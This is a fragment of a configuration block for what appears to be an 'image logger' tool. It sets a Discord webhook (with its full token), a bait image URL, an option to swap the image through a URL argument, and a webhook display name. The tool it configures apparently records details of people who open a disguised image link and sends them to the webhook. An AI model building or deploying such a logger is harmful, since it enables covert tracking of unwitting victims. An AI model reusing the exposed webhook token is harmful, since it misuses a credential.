...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1488303559253557328/p9bIoWqDvWsdk31Zmk03NooN1hH_A2OxjA-48klOoQKyNi_1_pfAY7TKSZEqNg-dYy19",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtXmg1iJnZXbMn3Q8zSTunbLE_uppF4ZNLxQ&s", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "stivkaXAXA", # Set this to the name you want the webhook to have
